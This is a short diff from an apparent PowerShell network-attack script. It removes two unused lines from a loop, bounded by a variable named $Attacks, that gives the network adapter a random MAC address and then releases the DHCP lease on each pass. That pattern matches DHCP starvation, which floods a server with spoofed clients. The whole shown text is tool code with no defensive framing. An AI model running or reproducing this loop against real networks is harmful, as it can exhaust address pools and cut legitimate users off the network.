@@ -29,8 +29,6 @@ While ($true){
 
 
 for ($i = 0;$i -lt $Attacks;$i++){
-    $bit1 = Get-Random -Minimum 0 -Maximum 9
-    $bit2 = Get-Random -Minimum 0 -Maximum 9
     $randomMAC = ([string]::Format("{0:X2}:{1:X2}:{2:X2}:{3:X2}:{4:X2}:{5:X2}", (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255), (Get-Random -Minimum 0 -Maximum 255)))
     Set-NetAdapter -Name $NetAdapter.Name -MacAddress $randomMAC -Confirm:$false
     Invoke-Expression -Command "ipconfig /release" #DHCP Release
